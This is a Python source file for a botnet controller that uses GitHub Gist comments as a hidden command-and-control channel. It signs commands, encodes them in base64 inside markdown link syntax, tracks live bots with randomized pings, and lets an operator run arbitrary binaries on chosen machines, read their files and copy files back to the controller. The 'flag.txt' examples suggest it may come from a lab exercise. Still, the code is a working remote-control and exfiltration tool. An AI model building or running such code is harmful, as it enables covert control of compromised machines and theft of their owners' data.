import base64
import threading
import random
from time import sleep, time
from github.GistComment import GistComment
from typing import List

from shared import Shared
from nacl.signing import SigningKey


class Controller:
    def __init__(self, token:str, gistID: str, signature: str):
        self.shared = Shared(token, gistID)
        self.active = True
        self.response_thread = threading.Thread(target = self.get_response, daemon=True)
        self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
        self.last_ping = None

        self.signing_key = SigningKey(base64.b64decode(signature.encode("utf-8")))
        print(f"Key: {base64.b64encode(self.signing_key.verify_key.encode()).decode('utf-8')}")

        self.bots = {}
        self.bots_lock = threading.Lock()

        self.selected_bot = None
        self.file_name = ""

        self.response_thread.start()
        self.ping_thread.start()
        self.wait_user_input()
    
    def get_response(self):
        while self.active:
            for fresh in self.shared.check_comments():
                self.manage_response(fresh)
            
            sleep(random.uniform(1,7))

    def parse_response(self, response: GistComment) -> (str, str):

        response_footer = response.body[response.body.rfind("[") :]
        response_id = base64.b64decode(response_footer.split("(")[1].split(")")[0].encode("utf-8")).decode("utf-8")

        bot_id = response_id.split("-")[1]
        command_id = int(response_id.split("-")[0])

        return bot_id, command_id

    def manage_response(self, response: GistComment):
        
        with self.bots_lock:
            if Shared.RES_PING in response.body:
                bot_id, command_id = self.parse_response(response)

                if not self.bots.get(bot_id):
                    self.bots[bot_id] = {}
            
                self.bots[bot_id]["last_ping"] = command_id
                print(f"Last ping: {bot_id}")
 
            
            elif Shared.RES_USERS in response.body:
                bot_id, command_id = self.parse_response(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

                    print(f"\n{output}")
                    bot["commands"].pop(command_id)

            elif Shared.RES_CONTENT in response.body:
                bot_id, command_id = self.parse_response(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

                    print(f"\n{output}")
                    bot["commands"].pop(command_id)

            elif Shared.RES_ID in response.body:
                bot_id, command_id = self.parse_response(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

                    print(f"\n{output}")
                    bot["commands"].pop(command_id)        

            elif Shared.RES_BINARY in response.body:
                bot_id, command_id = self.parse_response(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

                    print(f"\n{output}")
                    bot["commands"].pop(command_id)

            elif Shared.RES_COPY in response.body:
                bot_id, command_id = self.parse_response(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

                    file = open(self.file_name, "w") 
                    file.writelines(output)
                    file.close()

                    print(f"\nFile copied.")
                    bot["commands"].pop(command_id)

            elif Shared.RES_READ in response.body:
                bot_id, command_id = self.parse_response(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

                    print(f"\n{output}")
                    bot["commands"].pop(command_id)
        
    def ping_bots(self):

        while self.active:

            with self.bots_lock:
                active_bots = {}

                for bot_id, bot in self.bots.items():
                    if bot["last_ping"] == self.last_ping:
                        active_bots[bot_id] = bot
                    #elif bot["commands"]:
                        #self.cancel_commands(bot["commands"])
                    
                self.bots = active_bots

                if self.selected_bot not in self.bots:
                    self.selected_bot = None
                    
                self.last_ping = self.send_command(f"{Shared.REQ_PING}").id

            sleep(random.uniform(20, 80))
    
    def wait_user_input(self):

            while self.active:
                input_str = input(f"({self.selected_bot if self.selected_bot else '*'})$ ")
                args = input_str.split(" ")

                command = args[0].lower()

                if command == "exit":
                    self.exit()
                elif command == "status":
                    self.print_status()
                elif command == "help":
                    self.print_help()
                elif command == "list":
                    self.print_bots()
                elif command == "bot":
                    self.select_bot(args[1:])
                elif command == "exec":
                    self.execute_command(args[1:])
                elif command == "":
                    continue
                else:
                    print("Invalid command. For a list of available commands enter 'help'.")   

    def exit(self):

        self.active = False

    def print_status(self):

        with self.bots_lock:
            print(f"Bots online: {len(self.bots)}")
    
    def print_bots(self):

        with self.bots_lock:
            for id in self.bots.keys():
                print(f"{id}")
    
    def select_bot(self, args: List[str]):

        if len(args) < 1:
            print("Invalid bot ID!")
            return
        
        with self.bots_lock:
            bot_id = args[0]

            if bot_id == "*":
                self.selected_bot = None
            elif bot_id in self.bots.keys():
                self.selected_bot = bot_id
            else:
                print("Invalid or offline bot :(")

    def print_help(self):
        print(
            f"\n"
            f"How may we help you today?\n"
            f"==================\n"
            f"List of available commands:\n"
            f"status\t\t\t=> Number of available bots\n"
            f"list\t\t\t=> List of available bots\n"
            f"bot <bot id>\t=> Select a bot to control\n"
            f"exec <command>\t=> Command for selected bot\n"
            f"exit\t\t\t=> Exit the communication channel\n"
            f"==================\n"
            f"Supported exec commands\n"
            f"w (ex. exec w)\t\t\t=> List of online users\n"
            f"ls <PATH> (ex. exec ls -a)\t\t=> List content of specified directory\n"
            f"id (ex. exec id)\t\t\t=> Id of current user\n"
            f"/user/bin/ps (ex. exec /usr/bin/ps)\t => Execute binary\n"
            f"copy <FILE NAME> (ex. exec copy flag.txt)\t => Copy a file to controller\n"
            f"cat <FILE NAME> (ex. exec cat flag.txt)\t => Read a file\n"
        )
        
    def execute_command(self, args: List[str]):

        with self.bots_lock:
            if not self.selected_bot:
                print("No bot is selected. One bot has to be selected!")
                return
            
            bot_id = base64.b64encode(self.selected_bot.encode("utf-8")).decode("utf-8")

            if args[0] == "ls":
                self.send_command(f"{Shared.REQ_CONTENT} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",save_command=True,)
            elif args[0] == "w":
                self.send_command(f"{Shared.REQ_USERS} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",save_command=True,)
            elif args[0] == "id":
                self.send_command(f"{Shared.REQ_ID} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",save_command=True,)
            elif args[0] == "cat":
                self.send_command(f"{Shared.REQ_READ} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",save_command=True,)
            elif args[0] == "copy":
                args[0] = "cat"
                path = args[1].split("/")
                self.file_name = path[len(path) - 1]
                self.send_command(f"{Shared.REQ_COPY} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",save_command=True,)
            else:
                self.send_command(f"{Shared.REQ_BINARY} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",save_command=True,)

    def send_command(self, command: str, save_command: bool = False) -> GistComment:

        signature = base64.b64encode(self.signing_key.sign(command.encode("utf-8")).signature).decode("utf-8")

        command += f" [](_{signature}_)"

        command = self.shared.send_msg(command)

        if save_command:
            bot = self.bots[self.selected_bot]

            if not bot.get("commands"):
                bot["commands"] = {}

            bot["commands"][command.id] = time()

        return command


def main():
    controller = Controller(
        "", #ghp
        "", #gistID
        ""  #32bit key
    )

if __name__== "__main__":
    main()
